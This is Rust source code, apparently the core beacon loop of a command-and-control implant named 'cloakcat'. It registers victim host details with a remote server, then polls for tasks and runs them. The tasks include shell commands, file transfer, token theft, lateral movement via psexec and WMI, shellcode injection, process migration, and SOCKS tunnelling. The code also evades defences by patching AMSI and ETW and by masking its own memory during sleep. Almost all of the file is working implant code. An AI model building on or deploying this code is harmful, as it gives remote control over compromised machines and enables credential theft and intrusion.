//! Beacon loop: poll for commands, execute, upload results.

macro_rules! debug_log {
    ($($arg:tt)*) => {
        #[cfg(debug_assertions)]
        eprintln!($($arg)*);
    }
}

use std::env;
use std::sync::Arc;
use std::time::Duration;

use anyhow::Context;
use base64::Engine;
use cloakcat_protocol::{
    profile_by_name, sign_result, BofTask, Command, DerivedKeys, DownloadTask, Endpoints,
    ExecuteAssemblyTask, InjectTask, JumpPsexecTask, JumpWmiTask, MakeTokenTask,
    MigrateTask, PollResponse, RemoteExecTask, ResultReq, SetSpawnToTask, ShinjectTask,
    SpawnInjectTask, SpawnTask, StealTokenTask, TaskType, TunnelAction, UploadTask,
};
use rand::Rng;
use tokio::time::sleep;

use crate::config::{load_agent_config, load_malleable_profile};
use crate::evasion::patch::PatchManager;
use crate::evasion::sleep_mask::SleepMask;
use crate::exec::run_command;
use crate::host::{collect_hostname, collect_ip_addrs, collect_os_version, collect_username};
use crate::tasks;
use crate::transport::{HttpTransport, Transport};

fn rand_between(min_ms: u64, max_ms: u64) -> Duration {
    if min_ms >= max_ms {
        return Duration::from_millis(min_ms);
    }
    let mut rng = rand::rng();
    let v = rng.random_range(min_ms..=max_ms);
    Duration::from_millis(v)
}

fn advance_backoff(current: Option<u64>, max_ms: u64) -> u64 {
    match current {
        Some(b) => (b * 2).min(max_ms),
        None => 2_000,
    }
}

/// Sleep with optional sleep-mask.  When a `SleepMask` is active, the beacon's
/// `.text` section is XOR-encrypted during the sleep interval and restored on
/// wake.  The masked sleep blocks an OS thread, so it runs via `spawn_blocking`.
async fn beacon_sleep(mask: &Option<Arc<SleepMask>>, duration: Duration) {
    if let Some(m) = mask {
        let m = Arc::clone(m);
        let ms = duration.as_millis() as u32;
        let _ = tokio::task::spawn_blocking(move || {
            m.masked_sleep(ms);
        })
        .await;
        return;
    }
    sleep(duration).await;
}

#[allow(clippy::too_many_arguments)]
async fn upload_result<T: Transport>(
    transport: &T,
    result_url: &str,
    agent_id: &str,
    signing_key: &[u8],
    auth_token: &str,
    cmd_id: &str,
    exit_code: i32,
    stdout: &str,
    stderr: &str,
) -> anyhow::Result<()> {
    let signature = sign_result(agent_id, cmd_id, stdout, signing_key);
    let body = ResultReq {
        cmd_id: cmd_id.to_string(),
        exit_code,
        stdout: stdout.to_string(),
        stderr: stderr.to_string(),
        signature,
    };
    transport.send_result(result_url, auth_token, &body).await
}

async fn dispatch_task<T: Transport>(
    transport: &T,
    c2_url: &str,
    agent_id: &str,
    auth_token: &str,
    cmd: &Command,
    token_state: &mut tasks::token::TokenState,
    spawn_process: &mut Option<String>,
    use_syscalls: bool,
    ppid_spoof: Option<&str>,
) -> anyhow::Result<(i32, String, String)> {
    match cmd.task_type {
        TaskType::Shell => run_command(cmd).await,
        TaskType::Upload => {
            let task: UploadTask = serde_json::from_str(&cmd.command)
                .context("bad UploadTask payload")?;
            let file_url = format!("{}/v1/transfer/upload-file/{}", c2_url, task.transfer_id);
            tasks::fs::upload_handler(transport, &file_url, auth_token, &task.path).await
        }
        TaskType::Download => {
            let task: DownloadTask = serde_json::from_str(&cmd.command)
                .context("bad DownloadTask payload")?;
            let chunk_url = format!("{}/v1/transfer/download-chunk/{}", c2_url, agent_id);
            tasks::fs::download_handler(
                transport,
                &chunk_url,
                auth_token,
                &task.transfer_id,
                &task.path,
            )
            .await
        }
        TaskType::StealToken => {
            let task: StealTokenTask = serde_json::from_str(&cmd.command)
                .context("bad StealTokenTask payload")?;
            tasks::token::steal_token(token_state, task.pid)
        }
        TaskType::MakeToken => {
            let task: MakeTokenTask = serde_json::from_str(&cmd.command)
                .context("bad MakeTokenTask payload")?;
            tasks::token::make_token(token_state, &task.domain_user, &task.password)
        }
        TaskType::Rev2Self => tasks::token::rev2self(token_state),
        TaskType::JumpPsexec => {
            let task: JumpPsexecTask = serde_json::from_str(&cmd.command)
                .context("bad JumpPsexecTask payload")?;
            tasks::lateral::jump_psexec(&task.target, &task.payload_b64)
        }
        TaskType::JumpWmi => {
            let task: JumpWmiTask = serde_json::from_str(&cmd.command)
                .context("bad JumpWmiTask payload")?;
            tasks::lateral::jump_wmi(&task.target, &task.payload_b64)
        }
        TaskType::RemoteExec => {
            let task: RemoteExecTask = serde_json::from_str(&cmd.command)
                .context("bad RemoteExecTask payload")?;
            tasks::lateral::remote_exec(&task.method, &task.target, &task.command)
        }
        TaskType::Bof => {
            let task: BofTask = serde_json::from_str(&cmd.command)
                .context("bad BofTask payload")?;
            let bof_bytes = base64::engine::general_purpose::STANDARD
                .decode(&task.bof_b64)
                .context("bad BOF base64")?;
            let args_bytes = if task.args_b64.is_empty() {
                Vec::new()
            } else {
                base64::engine::general_purpose::STANDARD
                    .decode(&task.args_b64)
                    .context("bad BOF args base64")?
            };
            crate::bof::execute_bof(&bof_bytes, &args_bytes).await
        }
        TaskType::Inject => {
            let task: InjectTask = serde_json::from_str(&cmd.command)
                .context("bad InjectTask payload")?;
            let shellcode = base64::engine::general_purpose::STANDARD
                .decode(&task.shellcode_b64)
                .context("bad shellcode base64")?;
            tasks::inject::inject(task.pid, &shellcode, use_syscalls)
        }
        TaskType::Shinject => {
            let task: ShinjectTask = serde_json::from_str(&cmd.command)
                .context("bad ShinjectTask payload")?;
            tasks::inject::shinject(task.pid, &task.shellcode_path, use_syscalls)
        }
        TaskType::SpawnInject => {
            let task: SpawnInjectTask = serde_json::from_str(&cmd.command)
                .context("bad SpawnInjectTask payload")?;
            let shellcode = base64::engine::general_purpose::STANDARD
                .decode(&task.shellcode_b64)
                .context("bad shellcode base64")?;
            tasks::inject::spawn_inject(&shellcode, task.spawn_exe.as_deref(), spawn_process.as_deref(), use_syscalls, ppid_spoof)
        }
        TaskType::Migrate => {
            let task: MigrateTask = serde_json::from_str(&cmd.command)
                .context("bad MigrateTask payload")?;
            let shellcode = base64::engine::general_purpose::STANDARD
                .decode(&task.shellcode_b64)
                .context("bad shellcode base64")?;
            // migrate: inject into target, then ExitProcess (on Windows).
            tasks::inject::migrate(task.pid, &shellcode, use_syscalls)
        }
        TaskType::Spawn => {
            let task: SpawnTask = serde_json::from_str(&cmd.command)
                .context("bad SpawnTask payload")?;
            let shellcode = base64::engine::general_purpose::STANDARD
                .decode(&task.shellcode_b64)
                .context("bad shellcode base64")?;
            tasks::inject::spawn_inject(&shellcode, task.spawn_exe.as_deref(), spawn_process.as_deref(), use_syscalls, ppid_spoof)
        }
        TaskType::SetSpawnTo => {
            let task: SetSpawnToTask = serde_json::from_str(&cmd.command)
                .context("bad SetSpawnToTask payload")?;
            let old = spawn_process.as_deref().unwrap_or(tasks::inject::DEFAULT_SPAWN_PROCESS).to_string();
            *spawn_process = Some(task.path.clone());
            Ok((0, format!("[*] spawnto changed: '{}' → '{}'", old, task.path), String::new()))
        }
        TaskType::ExecuteAssembly => {
            let task: ExecuteAssemblyTask = serde_json::from_str(&cmd.command)
                .context("bad ExecuteAssemblyTask payload")?;
            let asm_bytes = base64::engine::general_purpose::STANDARD
                .decode(&task.assembly_b64)
                .context("bad assembly base64")?;
            tasks::assembly::execute_assembly(
                asm_bytes,
                task.args,
                task.inline,
                spawn_process.clone(),
            )
            .await
        }
    }
}

fn load_or_create_agent_id() -> String {
    let id_path = std::env::var("AGENT_ID_FILE")
        .map(std::path::PathBuf::from)
        .unwrap_or_else(|_| {
            std::env::current_exe()
                .unwrap_or_else(|_| std::path::PathBuf::from("."))
                .parent()
                .unwrap_or_else(|| std::path::Path::new("."))
                .join(".agent_id")
        });

    if let Ok(id) = std::fs::read_to_string(&id_path) {
        let id = id.trim().to_string();
        if uuid::Uuid::parse_str(&id).is_ok() {
            return id;
        }
    }

    let new_id = uuid::Uuid::new_v4().to_string();
    let _ = std::fs::write(&id_path, &new_id);
    new_id
}

pub async fn run() -> anyhow::Result<()> {
    let cfg = load_agent_config().context("config load failed")?;
    let agent_id = load_or_create_agent_id();

    // Prefer a malleable profile; fall back to the built-in name-based profile.
    let malleable = load_malleable_profile().context("malleable profile load failed")?;
    let (transport, endpoints) = if let Some(ref mp) = malleable {
        let t = HttpTransport::new_malleable(mp, &cfg.c2_url)?;
        let e = Endpoints::from_profile(&cfg.c2_url, mp, &agent_id);
        (t, e)
    } else {
        let profile = profile_by_name(&cfg.profile_name);
        let e = Endpoints::new(&cfg.c2_url, &cfg.profile_name, &agent_id);
        let t = HttpTransport::new(&*profile, &cfg.c2_url)?;
        (t, e)
    };

    // Initialise sleep mask if the malleable profile enables it.
    let sleep_mask: Option<Arc<SleepMask>> = if malleable
        .as_ref()
        .and_then(|mp| mp.stage.as_ref())
        .and_then(|s| s.sleep_mask)
        .unwrap_or(false)
    {
        match SleepMask::new() {
            Ok(m) => {
                debug_log!("[agent] sleep mask enabled");
                Some(Arc::new(m))
            }
            Err(e) => {
                debug_log!("[agent] sleep mask init failed: {e}, continuing without");
                None
            }
        }
    } else {
        None
    };

    // Apply AMSI + ETW patches unless CLOAKCAT_NO_PATCH=1.
    let mut _patch_mgr = PatchManager::new();
    if env::var("CLOAKCAT_NO_PATCH").as_deref() != Ok("1") {
        if let Err(e) = _patch_mgr.patch_etw() {
            debug_log!("[agent] ETW patch failed: {e}");
        } else {
            debug_log!("[agent] ETW patched");
        }
        if let Err(e) = _patch_mgr.patch_amsi() {
            debug_log!("[agent] AMSI patch failed: {e}");
        } else {
            debug_log!("[agent] AMSI patched");
        }
    }

    let reg = cloakcat_protocol::RegisterReq {
        agent_id: agent_id.clone(),
        platform: {
            #[cfg(target_os = "windows")]
            { "windows".to_string() }
            #[cfg(target_os = "macos")]
            { "darwin".to_string() }
            #[cfg(not(any(target_os = "windows", target_os = "macos")))]
            { "linux".to_string() }
        },
        hostname: collect_hostname(),
        username: collect_username(),
        os_version: collect_os_version(),
        ip_addrs: collect_ip_addrs(),
        alias: cfg.alias.clone(),
        note: cfg.note.clone(),
    };

    // Derive auth + signing keys from the shared master token via HKDF.
    let keys = DerivedKeys::from_master(cfg.shared_token.as_bytes());
    let auth_token = keys.auth_token();

    // SECURITY: auth_token is sent in plaintext over HTTP.
    // Set c2_url to https:// and configure TLS on the server for production use.
    let reg_json = transport
        .register(&endpoints.register, &auth_token, &reg)
        .await?;
    debug_log!("Registered: {:?}", reg_json);

    let beacon_min = env::var("AGENT_BEACON_MIN_MS")
        .ok()
        .and_then(|v| v.parse().ok())
        .unwrap_or(5_000);
    let beacon_max = env::var("AGENT_BEACON_MAX_MS")
        .ok()
        .and_then(|v| v.parse().ok())
        .unwrap_or(8_000);
    let backoff_max = env::var("AGENT_BACKOFF_MAX_MS")
        .ok()
        .and_then(|v| v.parse().ok())
        .unwrap_or(60_000);
    let mut backoff_ms: Option<u64> = None;
    let mut token_state = tasks::token::TokenState::new();
    let mut spawn_process: Option<String> = cfg.spawn_process.clone();

    // Shared reqwest::Client for all tunnel relay tasks.
    // Creating one per tunnel floods the connection pool; clone() is O(1).
    let tunnel_client = reqwest::Client::builder()
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap_or_default();

    loop {
        let url = format!("{}?hold=45", endpoints.poll);

        let (status, text) = match transport.poll(&url, &auth_token).await {
            Ok(r) => r,
            Err(e) => {
                debug_log!("[agent] poll send error: {e} -> backoff");
                let next = advance_backoff(backoff_ms, backoff_max);
                backoff_ms = Some(next);
                beacon_sleep(&sleep_mask, rand_between(next / 2, next)).await;
                continue;
            }
        };

        if status == 204 {
            debug_log!("[agent] poll: 204 no content -> sleep jitter");
            backoff_ms = None;
            beacon_sleep(&sleep_mask, rand_between(beacon_min, beacon_max)).await;
            continue;
        }
        if !(200..300).contains(&status) {
            debug_log!("[agent] poll error: {} -> sleep jitter", status);
            let next = advance_backoff(backoff_ms, backoff_max);
            backoff_ms = Some(next);
            beacon_sleep(&sleep_mask, rand_between(next / 2, next)).await;
            continue;
        }

        let trimmed = text.trim();
        if trimmed == "{}" || trimmed.is_empty() {
            backoff_ms = None;
            beacon_sleep(&sleep_mask, rand_between(beacon_min, beacon_max)).await;
            continue;
        }

        let resp: PollResponse = match serde_json::from_str(trimmed) {
            Ok(r) => r,
            Err(e) => {
                debug_log!("[agent] poll JSON parse error: {e}. raw={}", trimmed);
                backoff_ms = None;
                beacon_sleep(&sleep_mask, rand_between(beacon_min, beacon_max)).await;
                continue;
            }
        };

        // Spawn tunnel tasks for any Open frames received.
        for frame in resp.tunnel_frames {
            if frame.action == TunnelAction::Open {
                debug_log!("[agent] tunnel open: id={} target={}", frame.tunnel_id, frame.data);
                let c2 = cfg.c2_url.clone();
                let ai = agent_id.clone();
                let tok = auth_token.clone();
                let tid = frame.tunnel_id;
                let target = frame.data.clone();
                let tc = tunnel_client.clone(); // O(1) Arc clone
                tokio::spawn(async move {
                    crate::tunnel::socks5::run_tunnel(tc, c2, ai, tok, tid, target).await;
                });
            }
        }

        // If no command, sleep and loop.
        let cmd: Command = match resp.command {
            Some(c) => c,
            None => {
                backoff_ms = None;
                beacon_sleep(&sleep_mask, rand_between(beacon_min, beacon_max)).await;
                continue;
            }
        };
        debug_log!("[agent] poll: got cmd id={} type={:?}", cmd.cmd_id, cmd.task_type);

        let (exit_code, stdout, stderr) = match dispatch_task(&transport, &cfg.c2_url, &agent_id, &auth_token, &cmd, &mut token_state, &mut spawn_process, cfg.use_syscalls, cfg.ppid_spoof.as_deref()).await {
            Ok(triple) => triple,
            Err(e) => {
                debug_log!("[agent] task error: {e} -> send minimal result");
                let exit_code = -1;
                let stdout = String::new();
                let stderr = format!("task error: {e}");
                if let Err(e) = upload_result(
                    &transport,
                    &endpoints.result,
                    &agent_id,
                    &keys.signing_key,
                    &auth_token,
                    &cmd.cmd_id,
                    exit_code,
                    &stdout,
                    &stderr,
                )
                .await
                {
                    debug_log!("[agent] result upload after task error failed: {e}");
                }
                backoff_ms = None;
                beacon_sleep(&sleep_mask, rand_between(beacon_min, beacon_max)).await;
                continue;
            }
        };

        debug_log!(
            "[agent] exec done: exit={} stdout_len={} stderr_len={}",
            exit_code,
            stdout.len(),
            stderr.len()
        );

        if let Err(e) = upload_result(
            &transport,
            &endpoints.result,
            &agent_id,
            &keys.signing_key,
            &auth_token,
            &cmd.cmd_id,
            exit_code,
            &stdout,
            &stderr,
        )
        .await
        {
            debug_log!("[agent] result upload failed: {e} -> sleep jitter");
            let next = advance_backoff(backoff_ms, backoff_max);
            backoff_ms = Some(next);
            beacon_sleep(&sleep_mask, rand_between(next / 2, next)).await;
            continue;
        } else {
            debug_log!("[agent] result uploaded: id={} ok", cmd.cmd_id);
        }

        backoff_ms = None;
        beacon_sleep(&sleep_mask, rand_between(beacon_min, beacon_max)).await;
    }
}
